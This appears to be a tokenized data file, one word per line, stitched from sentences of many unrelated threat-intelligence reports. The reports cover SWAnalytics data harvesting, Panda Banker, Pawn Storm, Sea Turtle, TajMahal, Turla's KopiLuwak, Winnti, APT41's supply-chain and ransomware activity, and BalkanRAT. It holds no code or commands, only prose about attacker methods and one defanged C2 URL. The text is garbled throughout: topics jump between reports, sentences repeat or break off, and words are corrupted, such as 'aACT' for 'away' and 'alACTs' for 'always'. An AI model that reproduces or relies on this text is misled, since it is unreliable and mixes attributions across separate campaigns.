Technologies
could
have
collected
a
third
of
Chinas
population
names
and
contact
numbers
if
not
more
.
 
With
no
clear
declaration
of
usage
from
Shun
Wang
,
nor
proper
regulatory
supervision
,
such
data
could
circulate
into
underground
markets
for
further
exploit
,
ranging
from
rogue
marketing
,
targeted
telephone
scams
or
even
friend
referral
program
abuse
during
Novembers
Singles
Day
and
Decembers
Asian
online
shopping
fest
.
 
This
paper
will
cover
the
discovery
of
this
campaign
,
dubbed
Operation
Sheep
,
and
an
analysis
of
SWAnalytics
.
 
In
mid-September
,
an
app
named
Network
Speed
Master
stood
out
on
our
radar
with
its
rather
unusual
behavior
patterns
.
 
This
module
monitors
a
wide
range
of
device
activities
including
application
installation
/
remove
/
update
,
phone
restart
and
battery
charge
.
 
It
turns
out
that
contacts
data
isnt
the
only
unusual
data
SWAnalytics
is
interested
in
.
 
With
default
settings
,
SWAnalytics
will
scan
through
an
Android
devices
external
storage
,
looking
for
directory
tencent/MobileQQ/WebViewCheck
.
 
From
our
first
malicious
sample
encounter
back
in
mid-September
until
now
,
we
have
observed
12
infected
applications
,
the
majority
of
which
are
in
the
system
utility
category
.
 
By
listing
sub-folders
,
SWAnalytics
is
able
to
infer
QQ
accounts
which
have
never
been
used
on
the
device
.
 
Operation
Sheep
is
the
first
campaign
we
have
observed
in
the
wild
that
abuses
similar
concept
since
our
MitD
publication
.
 
To
make
this
data
harvesting
operation
flexible
,
SWAnalytics
equips
the
ability
to
receive
and
process
configuration
files
from
a
remote
Command-and-Control
.
 
Whenever
users
reboot
their
device
or
open
up
Network
Speed
Master
,
SWAnalytics
will
fetch
the
latest
configuration
file
from
http[:]//mbl[.]shunwang[.]com/cfg/config[.]json
.
 
In
order
to
understand
SWAnalytics
impact
,
we
turned
to
public
download
volume
data
available
on
Chandashi
,
one
of
the
app
store
optimization
vendors
specialized
in
Chinese
mobile
application
markets
.
 
Data
points
span
from
September
2018
to
January
2019
where
we
observed
over
17
million
downloads
in
just
five
months
.
 
In
China
alone
,
we
have
seen
underground
market
sheep
shavers
ported
SMS
rogue
marketing
strategy
to
spread
Alipay
Red
Packet
referral
URL
links
.
 
In
Operation
Sheeps
case
,
Shun
Wang
likely
harvests
end
user
contact
lists
without
application
developer
acknowledgement
.
 
According
to
Cheetah
Mobiles
follow-up
investigation
,
fraudulent
behaviors
came
from
two
3rd
party
SDKs
Batmobi
,
Duapps
integrated
inside
Cheetah
SDK
.
 
It
is
likely
a
new
campaign
or
actor
started
using
Panda
Banker
since
in
addition
to
the
previously
unseen
Japanese
targeting
,
Arbor
has
not
seen
any
indicator
of
compromise
(IOC)
overlaps
with
previous
Panda
Banker
campaigns
.
 
Webinjects
targeting
Japan
,
a
country
we
havent
seen
targeted
by
Panda
Banker
before
.
 
Japan
is
no
stranger
to
banking
malware
.
 
Based
on
recent
reports
,
the
country
has
been
plagued
by
attacks
using
the
Ursnif
and
Urlzone
banking
malware
.
 
This
post
was
our
first
analysis
of
the
first
Panda
Banker
campaign
that
weve
seen
to
target
financial
institutions
in
Japan
.
 
Operation
Pawn
Storm
is
an
active
economic
and
political
cyber-espionage
operation
that
targets
a
wide
range
of
entities
,
like
the
military
,
governments
,
defense
industries
,
and
the
media
.
 
we
believe
the
iOS
malware
gets
installed
on
already
compromised
systems
,
and
it
is
very
similar
to
next
stage
SEDNIT
malware
we
have
found
for
Microsoft
Windows
systems
.
 
we
found
two
malicious
iOS
applications
in
Operation
Pawn
Storm
.
 
One
is
called
XAgent
detected
as
IOS_XAGENT.A
and
the
other
one
uses
the
name
of
a
legitimate
iOS
game
,
MadCap
detected
as
IOS_
XAGENT.B
.
 
The
obvious
goal
of
the
SEDNIT-related
spyware
is
to
steal
personal
data
,
record
audio
,
make
screenshots
,
and
send
them
to
a
remote
command-and-control
(C&C)
server
.
 
To
learn
more
about
this
campaign
,
you
may
refer
to
our
report
,
Operation
Pawn
Storm
Using
Decoys
to
Evade
Detection
.
 
Additionally
,
we
discovered
a
new
DNS
hijacking
technique
that
we
assess
with
moderate
confidence
is
connected
to
the
actors
behind
Sea
Turtle
.
 
Talos
now
has
moderate
confidence
that
the
threat
actors
behind
Sea
Turtle
have
been
using
another
DNS
hijacking
technique
.
 
This
technique
was
also
observed
against
a
government
organizations
in
the
Middle
East
and
North
African
region
.
 
Cisco
telemetry
confirmed
that
the
actors
behind
Sea
Turtle
maintained
access
to
the
ICS-Forth
network
from
an
operational
command
and
control
(C2)
node
.
 
Our
telemetry
indicates
that
the
actors
maintained
access
in
the
ICS-Forth
network
through
at
least
April
24
,
five
days
after
the
statement
was
publicly
released
.
 
This
full-blown
spying
framework
consists
of
two
packages
named
Tokyo
and
Yokohama
.
 
Just
to
highlight
its
capabilities
,
TajMahal
is
able
to
steal
data
from
a
CD
burnt
by
a
victim
as
well
as
from
the
printer
queue
.
 
The
first
confirmed
date
when
TajMahal
samples
were
seen
on
a
victims
machine
is
August
2014
.
 
More
details
about
TajMahal
are
available
to
customers
of
the
Kaspersky
Intelligence
Reporting
service
.
 
The
dropper
first
appeared
in
mid-July
,
suggesting
that
this
APT
activity
is
potentially
ongoing
,
with
Turla
actively
targeting
G20
participants
and/or
those
with
interest
in
the
G20
,
including
member
nations
,
journalists
,
and
policymakers
.
 
Turla
is
a
well-documented
,
long
operating
APT
group
that
is
widely
believed
to
be
a
Russian
state-sponsored
organization
.
 
Turla
is
perhaps
most
notoriously
suspected
as
responsible
for
the
breach
of
the
United
States
Central
Command
in
2008
.
 
More
recently
Turla
was
accused
of
breaching
RUAG
,
a
Swiss
technology
company
,
in
a
public
report
published
by
GovCERT.ch
.
 
The
delivery
of
KopiLuwak
in
this
instance
is
currently
unknown
as
the
MSIL
dropper
has
only
been
observed
by
Proofpoint
researchers
on
a
public
malware
repository
.
 
Assuming
this
variant
of
KopiLuwak
has
been
observed
in
the
wild
,
there
are
a
number
of
ACTs
it
may
have
been
delivered
including
some
of
Turlas
previous
attack
methods
such
as
spear
phishing
or
via
a
watering
hole
.
 
This
could
include
diplomats
,
experts
in
the
LOCs
of
interest
related
to
the
Digital
Economy
Task
Force
,
or
possibly
even
journalists
.
 
Turla's
goal
could
include
diplomats
,
experts
in
the
LOCs
of
interest
related
to
the
Digital
Economy
Task
Force
,
or
possibly
even
journalists
.
 
The
earliest
step
in
any
possible
attack(s)
involving
this
variant
of
KopiLuwak
of
which
Proofpoint
researchers
are
currently
aware
begin
with
the
MSIL
dropper
.
 
The
basic
chain
of
events
upon
execution
of
the
MSIL
dropper
include
dropping
and
executing
both
a
PDF
decoy
and
a
Javascript
(JS)
dropper
.
 
As
explained
in
further
detail
below
,
the
JS
dropper
ultimately
installs
a
JS
decryptor
onto
an
infected
machine
that
will
then
finally
decrypt
and
execute
the
actual
KopiLuwak
backdoor
in
memory
only
.
 
As
Proofpoint
has
not
yet
observed
this
attack
in
the
wild
it
is
likely
that
there
is
an
additional
component
that
leads
to
the
execution
of
the
MSIL
payload
.
 
The
newer
variant
of
KopiLuwak
is
now
capable
of
exfiltrating
files
to
the
C&C
as
well
as
downloading
files
and
saving
them
to
the
infected
machine
.
 
Despite
the
added
capabilities
,
we
still
agree
with
Kaspersky
that
this
backdoor
is
likely
used
as
an
initial
reconnaissance
tool
and
would
probably
be
used
as
a
staging
point
to
deploy
one
of
Turlas
more
fully
featured
implants
.
 
Turla
is
a
complex
cyberattack
platform
focused
predominantly
on
diplomatic
and
government-related
targets
,
particularly
in
the
Middle
East
,
Central
and
Far
East
Asia
,
Europe
,
North
and
South
America
and
former
Soviet
bloc
nations
.
 
We
didnt
choose
to
name
it
after
a
vegetable;
the
.NET
malware
developers
named
it
Topinambour
themselves
.
 
The
role
of
the
.NET
module
is
to
deliver
the
known
KopiLuwak
JavaScript
Trojan
.
 
Moreover
,
Turla
now
also
has
a
heavily
obfuscated
PowerShell
Trojan
that
is
similar
to
KopiLuwak
.
 
These
campaign-related
VPSs
are
located
in
South
Africa
.
 
The
tool
does
all
that
a
typical
Trojan
needs
to
accomplish:
upload
,
download
and
execute
files
,
fingerprint
target
systems
.
 
The
PowerShell
version
of
the
Trojan
also
has
the
ability
to
get
screenshots
.
 
The
Trojan
is
quite
similar
to
the
.NET
RocketMan
Trojan
Obviously
and
can
handle
the
same
commands;
additionally
,
it
includes
the
#screen
command
to
take
a
screenshot
.
 
The
usage
of
KopiLuwak
,
a
well-known
and
exclusive
artefact
previously
used
by
the
Turla
group
,
makes
us
attribute
this
campaign
to
this
actor
with
high
confidence
.
 
Winnti
mode
of
operation
to
collect
information
on
the
organizational
charts
of
companies
,
on
cooperating
departments
,
on
the
IT
systems
of
individual
business
units
,
and
on
trade
secrets
,
obviously
.
 
Hackers
usually
take
precautions
,
which
experts
refer
to
as
Opsec
.
 
The
Winnti
groups
Opsec
was
dismal
to
say
the
least
.
 
This
mode
of
operation
is
typical
of
many
hacker
groupsand
especially
of
Winnti
.
 
They
are
a
very
,
very
persistent
group
,
says
Costin
Raiu
,
who
has
been
watching
Winnti
since
2011
.
 
Raiu
and
his
team
have
followed
the
digital
tracks
left
behind
by
some
of
the
Winnti
hackers
.
 
One
government
official
puts
it
very
matter-of-factly:
Winnti
is
very
specific
to
Germany
.
 
By
2014
,
the
Winnti
malware
code
was
no
longer
limited
to
game
manufacturers
.
 
Winnti
is
targeting
high-tech
companies
as
well
as
chemical
and
pharmaceutical
companies
.
 
Winnti
is
attacking
companies
in
Japan
,
France
,
the
U.S.
and
Germany
.
 
The
Winnti
hackers
broke
into
Henkels
network
in
2014
.
 
Henkel
confirms
the
Winnti
incident
and
issues
the
following
statement:
The
cyberattack
was
discovered
in
the
summer
of
2014
and
Henkel
promptly
took
all
necessary
precautions
.
 
Far
from
attacking
Henkel
and
the
other
companies
arbitrarily
,
Winnti
takes
a
highly
strategic
approach
.
 
The
hackers
behind
Winnti
have
also
set
their
sights
on
Japans
biggest
chemical
company
,
Shin-Etsu
Chemical
.
 
In
the
case
of
another
Japanese
company
,
Sumitomo
Electric
,
Winnti
apparently
penetrated
their
networks
during
the
summer
of
2016
.
 
Winnti
hackers
also
penetrated
the
BASF
and
Siemens
networks
.
 
Thanks
to
this
tool
,
we
found
out
back
in
March
2019
that
the
Bayer
pharmaceutical
group
had
been
hacked
by
Winnti
.
 
At
Gameforge
,
the
Winnti
hackers
had
already
been
removed
from
the
networks
when
a
staff
member
noticed
a
Windows
start
screen
with
Chinese
characters
.
 
To
witnesses
,
the
spy
appears
to
be
running
a
program
showing
videos
,
presenting
slides
(
Prezi
)
,
playing
a
computer
game
or
even
running
a
fake
virus
scanner
.
 
From
the
time
of
file
creation
,
the
attacker
started
working
at
least
as
early
as
July
2018
.
 
The
link
to
feeds.rapidfeeds.com
left
in
its
XML
configuration
file
was
also
mentioned
by
Kasperskys
report
in
the
reference
section
,
which
confirms
that
the
APT-C-09
group
keeps
updating
its
C2
configuration
channel
and
the
recent
one
reserves
some
past
features
.
 
For
example
,
Donot
and
Bitter
disguised
as
Kashmiri
Voice
to
attack
Pakistan
,
Transparent
Tribe
attacked
India
with
decoy
document
regarding
terrorist
attacks
in
Kashmir
.
 
Considering
APT-C-09
,
Bitter
and
Donot
have
carried
out
targeted
attacks
against
China
,
we
must
take
actions
in
advance
and
keep
a
close
eye
on
their
recent
activities
.
 
APT41
espionage
operations
against
the
healthcare
,
high-tech
,
and
telecommunications
sectors
include
establishing
and
maintaining
strategic
access
,
and
through
mid-2015
,
the
theft
of
intellectual
property
.
 
FireEye
Threat
Intelligence
assesses
with
high
confidence
that
APT41
carries
out
an
array
of
financially
motivated
intrusions
,
particularly
against
the
video
game
industry
,
including
stealing
source
code
and
digital
certificates
,
virtual
currency
manipulation
,
and
attempting
to
deploy
ransomware
.
 
APT41
has
executed
multiple
software
supply
chain
compromises
,
gaining
access
to
software
companies
to
inject
malicious
code
into
legitimate
files
before
distributing
updates
.
 
APT41
is
unique
among
tracked
China-based
actors
in
that
it
leverages
non-public
malware
typically
reserved
for
espionage
operations
in
what
appears
to
be
activity
that
falls
outside
the
scope
of
state-sponsored
missions
.
 
Based
on
early
observed
activity
,
consistent
behavior
,
and
APT41's
unusual
focus
on
the
video
game
industry
,
we
believe
the
group's
cyber
crime
activities
are
most
likely
motivated
by
personal
financial
gain
or
hobbyist
interests
.
 
APT41
campaigns
include
most
of
the
incidents
previously
attributed
in
FireEye
Threat
Intelligence
reporting
to
GREF
Team
and
a
number
of
additional
clusters
that
were
previously
unnamed
.
 
Activity
traces
back
to
2012
when
individual
members
of
APT41
conducted
primarily
financially
motivated
operations
focused
on
the
video
game
industry
before
expanding
into
likely
statesponsored
activity
.
 
Learning
to
access
video
game
production
environments
enabled
APT41
to
develop
the
tactics
,
techniques
,
and
procedures
(TTPs)
that
were
later
leveraged
against
software
companies
to
inject
malicious
code
into
software
updates
.
 
APT41
has
targeted
organizations
in
14
countries
over
seven
years
,
including:
France
,
India
,
Italy
,
Japan
,
Myanmar
,
the
Netherlands
,
Singapore
,
South
Korea
,
South
Africa
,
Switzerland
,
Thailand
,
Turkey
,
the
United
Kingdom
,
and
the
United
States
(Figure
1)
.
 
APT41
espionage
operations
against
entities
in
these
countries
follow
targeting
of
verticals
consistent
with
Chinese
national
policy
priorities
.
 
We
believe
that
like
other
Chinese
espionage
operators
,
APT41
has
moved
toward
strategic
intelligence
collection
and
establishing
access
,
but
aACT
from
direct
intellectual
property
theft
.
 
In
2014
,
APT41
was
observed
carrying
out
espionage
campaigns
concurrently
with
financially
motivated
intrusions
,
demonstrating
that
they
could
balance
different
objectives
simultaneously
.
 
Since
2017
,
APT41's
activities
have
included
a
series
of
supply
chain
compromises
.
 
The
group
also
targeted
companies
involved
in
producing
motherboards
,
processors
,
and
server
solutions
for
enterprises
.
 
Since
2013
,
APT41
has
targeted
organizations
involved
in
the
research
,
development
,
and
sale
of
computer
components
used
for
machine-learning
,
autonomous
vehicles
,
medical
imaging
,
and
the
consumer
market
.
 
In
a
2014
compromise
,
APT41
targeted
a
European
conglomerate
and
specifically
focused
on
systems
physically
located
in
China
.
 
In
spring
2015
,
APT41
targeted
information
related
to
two
entities
undergoing
a
merger
announced
the
previous
year
.
 
Since
2017
,
APT41
has
consistently
targeted
telecommunications
companies
,
possibly
a
crucial
first
step
to
establish
a
foothold
in
targeting
a
particular
region
.
 
Targeted
telecom
companies
spanned
several
countries
,
and
recently
identified
intrusions
were
concentrated
in
countries
where
we
had
not
identified
any
prior
APT41
activity
.
 
In
July
and
August
2016
,
APT41
sent
spear-phishing
emails
to
Hong
Kong
media
organizations
known
for
pro-democracy
editorial
content
.
 
This
was
the
first
instance
we
have
observed
of
APT41
targeting
pro-democracy
groups
in
Hong
Kong
.
 
APT41
frequently
leverages
timely
news
stories
as
the
lure
content
in
their
spear-phishing
emails
,
although
social
engineering
content
does
not
alACTs
correlate
with
targeted
users
or
organizations
.
 
In
2015
,
APT41
targeted
a
Japanese
media
organization
with
a
lure
document
(Figure
3)
titled
(MERS)
,
which
translates
to
Prevention
of
Middle
East
Respiratory
Syndrome
(MERS)
.
 
APT41
activity
aimed
at
medical
device
companies
and
pharmaceuticals
is
demonstrative
of
the
group's
capacity
to
collect
sensitive
and
highly
valuable
intellectual
property
(IP)
,
although
we
have
not
observed
evidence
of
IP
theft
since
late
2015
.
 
Unlike
other
observed
Chinese
espionage
operators
,
APT41
conducts
explicit
financially
motivated
activity
,
which
has
included
the
use
of
tools
that
are
otherwise
exclusively
used
in
campaigns
supporting
state
interests
.
 
Although
APT41
initially
targeted
the
parent
company
,
30
percent
of
the
victimized
hosts
were
related
to
a
subsidiary
specialized
in
manufacturing
medical
devices
.
 
In
2018
,
we
observed
APT41
target
a
third
healthcare
company
,
although
their
goals
during
this
compromise
were
unclear
.
 
In
June
2018
,
APT41
sent
spear-phishing
emails
using
an
invitation
lure
to
join
a
decentralized
gaming
platform
linked
to
a
cryptocurrency
service
(Figure
5)
that
had
positioned
itself
as
a
medium
of
exchange
for
online
games
and
gambling
sites
.
 
This
provides
another
connection
between
the
targeting
of
the
cryptocurrency
organizations
and
video
game
targeting
.
 
In
October
2018
,
the
group
compiled
an
instance
of
XMRig
,
a
Monero
cryptocurrency
mining
tool
,
demonstrating
a
continued
interest
in
cryptocurrency
.
 
APT41
campaigns
focused
on
the
video
game
sector
have
largely
affected
studios
and
distributors
in
East
and
Southeast
Asia
,
although
global
companies
based
in
the
United
States
have
also
been
targeted
.
 
APT41
continuously
returns
to
targeting
the
video
game
sector
and
seems
to
have
matured
its
campaigns
through
lessons
learned
in
operations
against
the
industry
.
 
We
believe
these
operations
include
broadly
malicious
activity
that
can
enable
further
operations
,
such
as
targeting
game
source
code
and
compromising
digital
certificates
,
while
other
activities
are
explicitly
financially
motivated
,
such
as
abusing
in-game
currency
mechanics
.
 
In
October
2012
,
APT41
used
captured
credentials
to
compromise
a
jump
server
and
access
a
production
environment
where
they
deployed
a
Linux
version
of
PHOTO
.
 
Since
at
least
2012
,
APT41
has
repeatedly
gained
access
to
game
development
environments
within
affected
companies
,
including
online
multiplayer
networks
,
as
well
as
targeting
of
production
database
administrators
.
 
APT41
has
been
observed
inserting
malicious
code
into
legitimate
video
game
files
to
distribute
malware
.
 
In
2018
,
the
group
inserted
CRACKSHOT
malware
into
game
files
that
were
signed
with
legitimate
codesigning
certificates
,
most
likely
indicating
access
to
the
production
environment
,
which
facilitated
a
supply
chain
compromise
.
 
We
have
also
observed
APT41
limitedly
deploy
rootkits
on
Linux
systems
and
Master
Boot
Record
(MBR)
bootkits
,
such
as
ROCKBOOT
,
on
Windows
systems
to
hide
their
malware
and
maintain
persistence
on
victim
systems
.
 
Selective
deployment
of
ROCKBOOT
suggests
that
APT41
reserves
more
advanced
TTPs
and
malware
only
for
high-value
targets
.
 
APT41
has
blatantly
engaged
in
financially
motivated
activity
targeting
the
video
game
industry
,
including
manipulating
virtual
currencies
.
 
In
a
highly
unusual
case
,
APT41
attempted
to
extort
a
game
company
by
deploying
the
Encryptor
RaaS
ransomware
.
 
APT41
is
well-known
for
leveraging
compromised
digital
certificates
from
video
game
studios
to
sign
malware
.
 
We
suggest
that
APT41
sought
to
target
in-game
currency
but
found
they
could
not
monetize
the
specific
targeted
game
,
so
the
group
resorted
to
ransomware
to
attempt
to
salvage
their
efforts
and
profit
from
the
compromise
.
 
APT41
has
also
used
credentials
compromised
in
previous
operations
.
 
In
2014
,
APT41
compromised
an
online
billing/payment
service
using
VPN
access
between
a
third-party
service
provider
and
the
targeted
payment
service
.
 
Although
we
do
not
have
first-hand
evidence
of
APT41's
compromise
of
TeamViewer
,
we
have
observed
APT41
use
compromised
TeamViewer
credentials
as
an
entry
point
at
multiple
organizations
.
 
Public
reports
of
supply
chain
compromises
linked
to
APT41
date
back
to
at
least
2014
,
and
technical
evidence
associated
with
these
incidents
was
used
to
determine
a
relationship
,
if
any
,
with
APT41
.
 
As
demonstrated
in
operations
targeting
the
video
game
industry
,
APT41
leverages
a
variety
of
TTPs
to
access
production
environments
where
they
can
inject
malicious
code
into
legitimate
files
.
 
In
March
2017
,
suspected
Chinese
espionage
operators
targeted
CCleaner
,
a
utility
that
assists
in
the
removal
of
unwanted
files
from
a
computer
.
 
In
July
2017
,
APT41
injected
malicious
code
into
a
software
update
package
maintained
by
Netsarang
and
signed
it
with
a
legitimate
Netsarang
certificate
in
an
operation
referred
to
as
ShadowPad
by
Kaspersky
.
 
Both
APT41
and
the
actors
in
the
CCleaner
incident
used
TeamViewer
during
initial
compromise
.
 
Supply
chain
compromises
are
most
likely
an
extension
of
APT41's
tactics
used
in
gaining
access
to
gaming
development
environments
and
to
other
gaming
organizations
via
third-party
service
providers
.
 
Beginning
in
July
2018
,
APT41
appeared
to
have
directly
targeted
several
East
and
Southeast
Asia-based
video
game
developers
and
distributors
to
inject
legitimate
executables
with
the
CRACKSHOT
backdoor
.
 
The
lure
used
to
target
the
cryptocurrency
exchange
(displayed
in
Figure
5
and
translated
in
Figure
6)
referenced
an
online
gaming
platform
,
tying
the
cryptocurrency
targeting
to
APT41's
focus
on
video
game-related
targeting
.
 
FireEye
malware
analysis
identified
source
code
overlaps
between
malware
used
by
APT41
in
May
2016
targeting
of
a
U.S.-based
game
development
studio
and
the
malware
observed
in
supply
chain
compromises
in
2017
and
2018
.
 
In
May
2016
,
APT41
deployed
a
POISONPLUG
sample
at
a
U.S.-based
game
development
studio
.
 
Alternatively
,
it
is
also
possible
that
APT41
injected
malicious
code
into
the
package
prior
to
compilation
,
circumventing
the
need
to
steal
the
code-signing
certificate
and
compile
it
on
their
own
.
 
Either
APT41
is
operating
outside
of
state
control
but
still
working
with
other
Chinese
APT
malware
actors
,
tools
,
and
infrastructure
on
a
parttime
or
contractual
basis
,
or
APT41
is
a
full-time
.
 
APT41
uses
many
of
the
same
tools
and
compromised
digital
certificates
that
have
been
leveraged
by
other
Chinese
espionage
operators
.
 
Initial
reports
about
HIGHNOON
and
its
variants
reported
publicly
as
Winnti
dating
back
to
at
least
2013
indicated
the
tool
was
exclusive
to
a
single
group
,
contributing
to
significant
conflation
across
multiple
distinct
espionage
operations
.
 
APT41
has
used
several
malware
families
that
have
also
been
used
by
other
Chinese
espionage
operators
,
including
variants
of
HIGHNOON
,
HOMEUNIX
,
PHOTO
,
SOGU
,
and
ZXSHELL
,
among
others
.
 
HIGHNOON
,
one
of
the
main
code
families
observed
being
used
by
APT41
,
was
also
used
by
APT17
in
2015
to
target
semiconductor
and
chemical
manufacturers
.
 
HOMEUNIX
,
another
popular
backdoor
used
by
APT41
,
has
been
used
by
at
least
14
separate
Chinese
espionage
groups
,
including
APT1
,
APT10
,
APT17
,
APT18
,
and
APT20
.
 
APT41
has
used
CROSSWALK.BIN
,
a
kernel
driver
,
to
circumvent
firewalls
and
covertly
send
data
.
 
Another
Chinese
espionage
group
used
a
similar
tool
,
CLASSFON
,
to
covertly
proxy
network
communications
in
2011
.
 
At
least
two
of
these
malware
families
,
HIGHNOON.CLI
and
GEARSHIFT
,
have
been
used
by
APT17
and
another
suspected
Chinese
espionage
group
.
 
APT41
regularly
leverages
code-signing
certificates
to
sign
malware
when
targeting
both
gaming
and
nongaming
organizations
.
 
In
July
2017
,
APT41
initiated
a
TeamViewer
session
and
transferred
files
that
were
later
deleted
.
 
In
these
instances
,
APT41
leveraged
TeamViewer
to
transfer
malware
into
the
compromised
environment
,
although
we
do
not
have
direct
evidence
of
APT41
compromising
TeamViewer
.
 
In
May
2018
,
APT41
used
TeamViewer
for
initial
entry
in
the
compromise
of
a
healthcare
company
.
 
Notably
,
APT41
was
observed
using
proof-of-concept
exploit
code
for
CVE-2019-3396
within
23
days
after
the
Confluence
.
 
APT41
has
targeted
payment
services
specializing
in
handling
in-game
transactions
and
real
money
transfer
(RMT)
purchases
.
 
The
group
will
also
use
a
compromised
account
to
create
scheduled
tasks
on
systems
or
modify
legitimate
Windows
services
to
install
the
HIGHNOON
and
SOGU
backdoors
.
 
APT41
uses
multiple
methods
to
perform
lateral
movement
in
an
environment
,
including
RDP
sessions
,
using
stolen
credentials
,
adding
accounts
to
User
and
Admin
groups
,
and
password
brute-forcing
utilities
.
 
To
maintain
presence
,
APT41
relies
on
backdoors
,
a
Sticky
Keys
vulnerability
,
scheduled
tasks
,
bootkits
,
rootkits
,
registry
modifications
,
and
creating
or
modifying
startup
files
.
 
APT41
leveraged
ROCKBOOT
as
a
persistence
mechanism
for
PHOTO
and
TERA
backdoors
.
 
APT41
has
also
been
observed
modifying
firewall
rules
to
enable
file
and
printer
sharing
to
allow
for
inbound
Server
Message
Block
(SMB)
traffic
.
 
In
some
instances
,
APT41
leveraged
POISONPLUG
as
a
first-stage
backdoor
to
deploy
the
HIGHNOON
backdoor
in
the
targeted
environment
.
 
The
group
also
deploys
the
SOGU
and
CROSSWALK
malware
families
as
means
to
maintain
presence
.
 
APT41
sent
spear-phishing
emails
to
multiple
HR
employees
three
days
after
the
compromise
had
been
remediated
and
systems
were
brought
back
online
.
 
APT41
also
deploys
the
SOGU
and
CROSSWALK
malware
families
as
means
to
maintain
presence
.
 
Within
hours
of
a
user
opening
the
malicious
attachment
dropping
a
HOMEUNIX
backdoor
,
APT41
regained
a
foothold
within
the
environment
by
installing
PHOTO
on
the
organization's
servers
across
multiple
geographic
regions
.
 
Before
attempting
to
deploy
the
publicly
available
Ransomware-as-a-Service
(RaaS)
Encryptor
RaaS
through
group
policy
,
APT41
blocked
victim
systems
from
retrieving
anti-virus
updates
by
accessing
the
DNS
management
console
and
implementing
a
forward
lookup
on
the
domain
used
for
anti-virus
updates
to
the
park
IP
address
1.1.1.1
.
 
APT41
has
been
observed
creating
a
RAR
archive
of
targeted
files
for
Exfiltration
.
 
APT41
is
unique
among
tracked
China-based
actors
in
that
it
leverages
non-public
malware
typically
reserved
for
espionage
campaigns
in
what
appears
to
be
activity
for
personal
gain
.
 
During
multiple
engagements
,
APT41
attempted
to
remove
evidence
of
some
of
its
activity
by
deleting
Bash
histories
,
clearing
Windows
security
and
system
events
,
and
modifying
DNS
management
to
avoid
anti-virus
detections
.
 
Explicit
financially-motivated
targeting
is
unusual
among
Chinese
statesponsored
threat
groups
,
and
evidence
suggests
APT41
has
conducted
simultaneous
cyber
crime
and
Cyber
Espionage
operations
from
2014
onward
.
 
APT41
operations
against
higher
education
,
travel
services
,
and
news/media
firms
provide
some
indication
that
the
group
also
tracks
individuals
and
conducts
surveillance
.
 
For
example
,
the
group
has
repeatedly
targeted
call
record
information
at
telecom
companies
.
 
APT41
has
established
and
maintained
strategic
access
to
organizations
in
the
healthcare
,
high-tech
,
and
telecommunications
sectors
.
 
The
groups
financially
motivated
activity
has
primarily
focused
on
the
video
game
industry
,
where
APT41
has
manipulated
virtual
currencies
and
even
attempted
to
deploy
ransomware
.
 
In
another
instance
,
APT41
targeted
a
hotels
reservation
systems
ahead
of
Chinese
officials
staying
there
,
suggesting
the
group
was
tasked
to
reconnoiter
the
facility
for
security
reasons
.
 
These
supply
chain
compromise
tactics
have
also
been
characteristic
of
APT41s
best
known
and
most
recent
espionage
campaigns
.
 
Interestingly
,
despite
the
significant
effort
required
to
execute
supply
chain
compromises
and
the
large
number
of
affected
organizations
,
APT41
limits
the
deployment
of
follow-on
malware
to
specific
victim
systems
by
matching
against
individual
system
identifiers
.
 
Mapping
the
groups
activities
since
2012
(Figure
2)
also
provides
some
indication
that
APT41
primarily
conducts
financially
motivated
operations
outside
of
their
normal
day
jobs
.
 
The
latter
is
especially
notable
because
APT41
has
repeatedly
returned
to
targeting
the
video
game
industry
and
we
believe
these
activities
were
formative
in
the
groups
later
espionage
operations
.
 
APT41
leverages
an
arsenal
of
over
46
different
malware
families
and
tools
to
accomplish
their
missions
,
including
publicly
available
utilities
,
malware
shared
with
other
Chinese
espionage
operations
,
and
tools
unique
to
the
group
.
 
Once
in
a
victim
organization
,
APT41
can
leverage
more
sophisticated
TTPs
and
deploy
additional
malware
.
 
APT41
often
relies
on
spear-phishing
emails
with
attachments
such
as
compiled
HTML
(
.chm
)
files
to
initially
compromise
their
victims
.
 
APT41
has
also
deployed
rootkits
and
Master
Boot
Record
(MBR)
bootkits
on
a
limited
basis
to
hide
their
malware
and
maintain
persistence
on
select
victim
systems
.
 
The
limited
use
of
these
tools
by
APT41
suggests
the
group
reserves
more
advanced
TTPs
and
malware
only
for
high-value
targets
.
 
Like
other
Chinese
espionage
operators
,
APT41
appears
to
have
moved
toward
strategic
intelligence
collection
and
establishing
access
and
aACT
from
direct
intellectual
property
theft
since
2015
.
 
This
shift
,
however
,
has
not
affected
the
group's
consistent
interest
in
targeting
the
video
game
industry
for
financially
motivated
reasons
.
 
BalkanRAT
enables
the
attacker
to
remotely
control
the
compromised
computer
via
a
graphical
interface
,
i.e.
,
manually;
BalkanDoor
enables
them
to
remotely
control
the
compromised
computer
via
a
command
line
,
i.e.
,
possibly
en
masse
.
 
With
the
contents
of
the
emails
,
included
links
and
decoy
PDFs
all
involving
taxes
,
the
attackers
are
apparently
targeting
the
financial
departments
of
organizations
in
the
Balkans
region
.
 
Some
parts
of
the
campaign
were
briefly
described
by
a
Serbian
security
provider
in
2016
and
the
Croatian
CERT
in
2017
.
 
The
campaign
has
been
active
at
least
from
January
2016
to
the
time
of
writing
the
most
recent
detections
in
our
telemetry
are
from
July
2019
.
 
Our
findings
show
that
the
mentioned
attacks
have
been
orchestrated
and
we
consider
them
a
single
long-term
campaign
that
spans
Croatia
,
Serbia
,
Montenegro
,
and
Bosnia
and
Herzegovina
.
 
Weve
discovered
a
new
version
of
BalkanDoor
with
a
new
method
for
execution/installation:
an
exploit
of
the
WinRAR
ACE
vulnerability
CVE-2018-20250
.
 
Both
BalkanRAT
and
BalkanDoor
spread
in
Croatia
,
Serbia
,
Montenegro
,
and
Bosnia
and
Herzegovina
.
 
According
to
our
telemetry
,
the
campaign
spreading
these
tools
has
been
live
since
2016
,
with
the
most
recent
detections
as
late
as
in
July
2019
.
 
In
some
of
the
latest
samples
of
BalkanDoor
detected
in
2019
,
the
malware
is
distributed
as
an
ACE
archive
,
disguised
as
a
RAR
archive
(i.e.
,
not
an
executable
file)
,
specially
crafted
to
exploit
the
WinRAR
ACE
vulnerability
CVE-2018-20250
.
 
Via
the
BalkanDoor
backdoor
,
the
attacker
sends
a
backdoor
command
to
unlock
the
screen
and
using
BalkanRAT
,
they
can
do
whatever
they
want
on
the
computer
.
 
The
BalkanDoor
backdoor
does
not
implement
any
Exfiltration
channel
.
 
APT41
leveraged
ADORE.XSEC
,
a
Linux
backdoor
launched
by
the
Adore-NG
rootkit
,
throughout
an
organization's
Linux
environment
.
 
The
backdoor
can
connect
to
any
of
the
C&Cs
from
a
hardcoded
list
a
measure
to
increase
resilience
.
 
The
main
part
of
the
BalkanRAT
malware
is
a
copy
of
the
Remote
